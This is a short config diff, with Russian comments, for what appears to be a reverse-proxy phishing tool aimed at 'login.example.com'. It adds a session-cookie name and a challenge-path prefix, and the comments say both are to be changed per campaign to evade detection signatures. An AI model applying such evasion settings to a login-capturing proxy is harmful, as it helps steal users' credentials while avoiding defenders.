@@ -2,6 +2,8 @@ bind: "0.0.0.0"
 https_port: 443
 shared_443: false # true = один 443 proxy+stealth API по Host (prod); false = split 8443+8080 (lab default)
 node_id: "" # пусто = hostname; или env PHANTOM_NODE_ID (видно в логах/событиях/captures)
+session_cookie: "sid" # имя session-cookie: свое на кампанию против сигнатур
+challenge_path: "/__fp" # префикс challenge-путей: свой против сигнатур
 domains:
   - "login.example.com"
 storage:
